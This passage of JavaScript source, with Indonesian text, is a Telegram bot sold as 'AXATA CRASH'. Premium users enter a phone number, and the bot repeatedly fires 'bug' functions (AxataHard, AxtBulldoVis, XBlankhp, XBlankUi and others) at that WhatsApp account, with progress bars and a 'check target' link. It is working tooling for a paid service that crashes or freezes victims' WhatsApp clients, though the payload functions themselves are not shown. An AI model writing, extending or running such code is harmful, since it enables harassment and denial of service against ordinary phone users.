        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 150; i++) {
            await AxtDelay(target, axata = false);
            await sleep(2000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/AxataHard (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 50; i++) {
            await AxataHard(target, true);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS BULDOZER ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/AxtBulldoVis (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 160; i++) {
            await AxtBulldoVis(axata, target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/Buldosedot (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 90; i++) {
            await Buldosedot(target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS BLANK ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/XBlankhp (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 40; i++) {
            await AxtSlowres(target);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/XBlankhp (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 75; i++) {
            await XBlankhp(axata, target);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/XBlankUi (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 154; i++) {
            await XBlankUi(axata, target);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/NotifXaxata (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
